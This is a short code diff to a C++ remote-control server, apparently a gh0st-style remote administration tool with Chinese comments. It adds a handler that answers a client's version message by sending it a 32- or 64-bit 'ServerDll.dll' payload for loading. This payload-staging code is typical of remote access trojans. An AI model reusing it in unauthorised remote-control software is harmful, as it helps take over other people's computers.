@@ -35,6 +35,7 @@
 #include <sys/MachineDlg.h>
 #include "Chat.h"
 #include "DecryptDlg.h"
+#include "adapter.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -1647,6 +1648,20 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	}
 	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
+	case TOKEN_GETVERSION: // 获取版本
+	{
+		// TODO 维持心跳
+		bool is64Bit = ContextObject->InDeCompressedBuffer.GetBYTE(1);
+		Buffer* bin = m_ServerBin[is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86];
+		DllSendData dll = { TASK_MAIN, L"ServerDll.dll", is64Bit, bin->length()-6 };
+		BYTE *resp = new BYTE[1 + sizeof(DllSendData) + dll.DataSize];
+		resp[0] = 0;
+		memcpy(resp+1, &dll, sizeof(DllSendData));
+		memcpy(resp+1+sizeof(DllSendData), bin->c_str() + 6, dll.DataSize);
+		m_iocpServer->OnClientPreSending(ContextObject, resp, 1 + sizeof(DllSendData) + dll.DataSize);
+		SAFE_DELETE_ARRAY(resp);
+		break;
+	}
 	case CMD_EXECUTE_DLL: // 请求DLL
 	{
 		DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
